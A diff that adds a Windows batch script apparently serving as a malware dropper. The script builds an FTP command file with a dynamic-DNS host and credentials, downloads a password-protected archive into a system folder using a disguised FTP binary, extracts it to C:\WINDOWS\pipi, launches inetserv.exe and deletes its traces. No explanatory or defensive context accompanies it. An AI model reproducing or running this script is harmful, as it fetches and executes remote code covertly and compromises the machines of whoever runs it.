@@ -1,0 +1,25 @@
+echo open cie.s.3322.net > sdy.log
+echo qice.cn >> sdy.log
+echo 360>> sdy.log
+echo binary >> sdy.log
+echo get sdy.rar C:\WINDOWS\WinSxS\InstallTemp\sdy.rar>> sdy.log
+echo bye >> sdy.log
+C:\WINDOWS\system32\wins\ftd.exe -s:sdy.log
+for %%a in ("C:\WINDOWS\WinSxS\InstallTemp\sdy.rar") do if %%~za gtr 40480 goto RAR
+goto exit
+:RAR
+C:\WINDOWS\system32\Rar.exe x -p810220 -t -o+ C:\WINDOWS\WinSxS\InstallTemp\sdy.rar C:\WINDOWS\pipi\
+for %%a in ("C:\WINDOWS\pipi\inetserv.exe") do if %%~za gtr 40480 goto RUN
+goto exit
+:RUN
+start C:\WINDOWS\pipi\inetserv.exe
+:exit
+del sdy.log. /q /f
+exit
+exit
+exit
+
+
+
+
+
